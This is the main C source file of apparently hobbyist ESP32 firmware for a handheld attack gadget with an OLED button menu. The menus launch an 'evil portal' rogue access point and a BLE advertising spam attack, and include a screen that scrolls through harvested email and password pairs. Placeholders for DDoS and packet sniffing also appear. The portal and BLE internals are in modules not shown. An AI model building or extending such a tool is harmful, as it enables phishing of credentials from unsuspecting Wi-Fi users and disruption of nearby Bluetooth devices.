#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "ssd1306.h"
#include "font8x8_basic.h"
#include "driver/gpio.h"

// custom headers
#include "ble.h"
#include "captive_portal.h"

// screen
#define tag "SSD1306"

// buttons
#define BUTTON_PIN1 26
#define BUTTON_PIN2 25
#define BUTTON_PIN3 27
#define LED_PIN 2 

#define DEBOUNCE_TIME 200 / portTICK_PERIOD_MS

// flag for stopping spam
volatile bool in_ble_attack = false;

// menu tree node - move to header
typedef struct MenuNode {
	char* options[10];
	int num_options;
	struct MenuNode** children;
	int num_children;
	struct MenuNode* parent;
	void (*actions[10])(SSD1306_t *dev);
} MenuNode;

ListNode* harvested_data_head = NULL;

MenuNode mainMenu;
MenuNode wifiSettings;
MenuNode evilPortalSettings;
MenuNode bluetoothSettings;
MenuNode* currentMenu;

int selected_index;

// function declarations: move to a header file
void exit_ble_mode(SSD1306_t *dev);
void display_menu(SSD1306_t *dev, MenuNode* currentMenu, int selected_index);

bool read_button(int pin) {
	return gpio_get_level(pin) == 0; // button pressed
}

void start_evil_portal(SSD1306_t *dev) {
    gpio_set_level(LED_PIN, 1);
    ESP_LOGI(tag, "Starting Evil AP mode...");
	captive_portal_main();
}

//  helper function to chunk node data into sized lines on screen
int display_chunked_text(SSD1306_t *dev, const char* text, int start_line, int max_lines) {
    int line = start_line;
    int len = strlen(text);
    
    for (int i = 0; i < len && line < max_lines; i += 16) {
        char chunk[17]; // 16 chars + null
        strncpy(chunk, &text[i], 16);
        chunk[16] = '\0'; // null-terminate manually
        ssd1306_display_text(dev, line++, chunk, strlen(chunk), false);
    }

    return line; // return the next available line index
}

void show_ap_harvest(SSD1306_t *dev) {
	int selected_index = 0;
    ListNode* current = harvested_data_head;
	MenuNode* returnMenu = &evilPortalSettings;

    int total_entries = 0;
    ListNode* tmp = harvested_data_head;
    while (tmp != NULL) {
        total_entries++;
        tmp = tmp->next;
    }

	ssd1306_clear_screen(dev, false);
    bool in_menu = true;
    while (in_menu) {
        if (current == NULL) {
            ssd1306_display_text(dev, 4, "No Data", 7, false);
        } else {
            ListNode* ptr = harvested_data_head;
            int i = 0;
            while (i < selected_index && ptr != NULL) {
                ptr = ptr->next;
                i++;
            }

            if (ptr != NULL) {
                int line = 0;
                line = display_chunked_text(dev, ptr->data.email, line, 8);
                line = display_chunked_text(dev, ptr->data.password, line, 8);
            }
        }

        // Show "Exit" if scrolled past last item
        if (selected_index >= total_entries) {
            ssd1306_display_text(dev, 0, "> Exit", 6, true);
        }

        vTaskDelay(DEBOUNCE_TIME);

        // Input handling
        if (read_button(BUTTON_PIN2)) {  // UP
			ssd1306_clear_screen(dev, false);
			ssd1306_contrast(dev, 0xff);
            selected_index--;
            if (selected_index < 0) selected_index = 0;
        }

        if (read_button(BUTTON_PIN3)) {  // DOWN
			ssd1306_clear_screen(dev, false);
			ssd1306_contrast(dev, 0xff);
            selected_index++;
            if (selected_index > total_entries) selected_index = total_entries;
        }

        if (read_button(BUTTON_PIN1)) {  // SELECT
			ssd1306_clear_screen(dev, false);
			ssd1306_contrast(dev, 0xff);
            if (selected_index >= total_entries) {
                // Exit option selected
                in_menu = false;
                currentMenu = returnMenu;
                display_menu(dev, currentMenu, 0);
            }
        }
    }
}

void ble_spam_task(void *pvParameters) {
    while (in_ble_attack) {
        ble_advertise();
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
    ESP_LOGI(tag, "Stopped spam attack...");
    vTaskDelete(NULL);
}

void start_ble_spam_attack(SSD1306_t *dev) {
    gpio_set_level(LED_PIN, 1); 
    ESP_LOGI(tag, "Starting spam attack...");
    in_ble_attack = true;
    xTaskCreate(ble_spam_task, "Macero BLE Spam", 2048, NULL, 5, NULL);
}

// ddos
void start_ddos_attack(SSD1306_t *dev) {
    gpio_set_level(LED_PIN, 1); 
    ESP_LOGI(tag, "Starting DDOS attack...");
}

// packet sniffer
void start_packet_sniffer(SSD1306_t *dev) {
    gpio_set_level(LED_PIN, 1); 
    ESP_LOGI(tag, "Starting packet sniffer...");
}

void exit_ble_mode(SSD1306_t *dev) {
    gpio_set_level(LED_PIN, 0); 
    ESP_LOGI(tag, "Exiting menu...");
    in_ble_attack = false;
	esp_err_t ret = esp_ble_gap_stop_advertising();
    if (ret == ESP_OK) {
        ESP_LOGI(tag, "Advertising stopped successfully");
    } else {
        ESP_LOGE(tag, "Failed to stop advertising: %s", esp_err_to_name(ret));
    }
}

void exit_ap_mode(SSD1306_t *dev) {
    gpio_set_level(LED_PIN, 0); 
    ESP_LOGI(tag, "Exiting menu...");
	stop_captive_portal(); // add error handle
}

void exit_menu(SSD1306_t *dev) {
	gpio_set_level(LED_PIN, 0); 
    ESP_LOGI(tag, "Exiting menu...");
}

void init_menus() {

    // define nodes first
    mainMenu = (MenuNode){
        .options = {"WiFi", "BLE"},
        .num_options = 2,
        .parent = NULL,
        .actions = {NULL, NULL}
    };

    wifiSettings = (MenuNode){
        .options = {"evil portal", "exit"},
        .num_options = 2,
        .parent = &mainMenu,
        .actions = {NULL, exit_menu}
    };

    evilPortalSettings = (MenuNode){
        .options = {"start evil AP", "data", "options", "exit"},
        .num_options = 4,
        .parent = &wifiSettings,
        .actions = {start_evil_portal, show_ap_harvest, NULL, exit_ap_mode}
    };

    bluetoothSettings = (MenuNode){
        .options = {"start BLE spam", "script select", "dump", "exit"},
        .num_options = 4,
        .parent = &mainMenu,
        .actions = {start_ble_spam_attack, NULL, NULL, exit_ble_mode}
    };

    // now that nodes exist, assign children
    static MenuNode* mainMenuChildrenLocal[] = { &wifiSettings, &bluetoothSettings };
    static MenuNode* wifiChildrenLocal[] = { &evilPortalSettings };

    mainMenu.children = mainMenuChildrenLocal;
    mainMenu.num_children = 2;

    wifiSettings.children = wifiChildrenLocal;
    wifiSettings.num_children = 1;

    currentMenu = &mainMenu;
}

void display_menu(SSD1306_t *dev, MenuNode* currentMenu, int selected_index) {

	ssd1306_clear_screen(dev, false);
	ssd1306_contrast(dev, 0xff);

	for (int i = 0; i < currentMenu->num_options; i++) {
		char line[20];
		if(i == selected_index) {
			snprintf(line, sizeof(line), "> %s", currentMenu->options[i]);
			ssd1306_display_text(dev, i, line, strlen(line), true);
		} else {
			snprintf(line, sizeof(line), " %s", currentMenu->options[i]);
			ssd1306_display_text(dev, i, line, strlen(line), false);
		}
	}
}

// traverse menu tree
void handle_menu_nav(SSD1306_t *dev, MenuNode** currentMenu, int* selected_index) {
    if (read_button(BUTTON_PIN1)) { // select button
        // save selected action and child first
        void (*selected_action)(SSD1306_t *) = (*currentMenu)->actions[*selected_index];
        MenuNode* selected_child = NULL;

        if ((*currentMenu)->children != NULL && *selected_index < (*currentMenu)->num_children) {
            selected_child = (*currentMenu)->children[*selected_index];
        }

        if (selected_action != NULL) {
            selected_action(dev);
        }

        // handle menu exit logic after running the action
        if (selected_action == exit_ble_mode || 
            selected_action == exit_ap_mode || 
            selected_action == exit_menu) 
        {
            *currentMenu = (*currentMenu)->parent;
            *selected_index = 0;
        } else if (selected_child != NULL) {
            *currentMenu = selected_child;
            *selected_index = 0;
        }

        display_menu(dev, *currentMenu, *selected_index);
		vTaskDelay(DEBOUNCE_TIME);
    }

	if (read_button(BUTTON_PIN2)) { // up button
		(*selected_index)--;
		if (*selected_index < 0) *selected_index = 0;
		display_menu(dev, *currentMenu, *selected_index);
		vTaskDelay(DEBOUNCE_TIME);
	}

	if (read_button(BUTTON_PIN3)) { // down button
		(*selected_index)++;
		if (*selected_index >= (*currentMenu)->num_options) *selected_index = (*currentMenu)->num_options -1;
		display_menu(dev, *currentMenu, *selected_index);
		vTaskDelay(DEBOUNCE_TIME);
	}

}

void app_main(void)
{
	// initialize menu tree
	init_menus();

	// initialize ble
	ble_init();

	// configure buttons
	gpio_set_direction(BUTTON_PIN1, GPIO_MODE_INPUT);
	gpio_set_pull_mode(BUTTON_PIN1, GPIO_PULLUP_ONLY);
	gpio_set_direction(BUTTON_PIN2, GPIO_MODE_INPUT);
	gpio_set_pull_mode(BUTTON_PIN2, GPIO_PULLUP_ONLY);
	gpio_set_direction(BUTTON_PIN3, GPIO_MODE_INPUT);
	gpio_set_pull_mode(BUTTON_PIN3, GPIO_PULLUP_ONLY);

	gpio_set_direction(LED_PIN, GPIO_MODE_OUTPUT);

    SSD1306_t dev; // pointer to screen config

	int selected_index = 0; // current selected item

#if CONFIG_I2C_INTERFACE
	ESP_LOGI(tag, "INTERFACE is i2c");
	ESP_LOGI(tag, "CONFIG_SDA_GPIO=%d",CONFIG_SDA_GPIO);
	ESP_LOGI(tag, "CONFIG_SCL_GPIO=%d",CONFIG_SCL_GPIO);
	ESP_LOGI(tag, "CONFIG_RESET_GPIO=%d",CONFIG_RESET_GPIO);
	i2c_master_init(&dev, CONFIG_SDA_GPIO, CONFIG_SCL_GPIO, CONFIG_RESET_GPIO);
#endif // CONFIG_I2C_INTERFACE

#if CONFIG_SSD1306_128x64
	ESP_LOGI(tag, "Panel is 128x64");
	ssd1306_init(&dev, 128, 64);
#endif // CONFIG_SSD1306_128x64

	// intro screen
	ssd1306_clear_screen(&dev, false);
	ssd1306_contrast(&dev, 0xff);
	ssd1306_display_text(&dev, 1, "__  _  _ _ ___ ", 16, false);
	ssd1306_display_text(&dev, 2, "|||(_|(_(/_|(_)", 16, false);

	vTaskDelay(3000 / portTICK_PERIOD_MS);

	// defaults
	currentMenu = &mainMenu;
	selected_index = 0;

	display_menu(&dev, currentMenu, selected_index);

	// menu loop
	while(1) {
		handle_menu_nav(&dev, &currentMenu, &selected_index);
		vTaskDelay(1);
	}
}
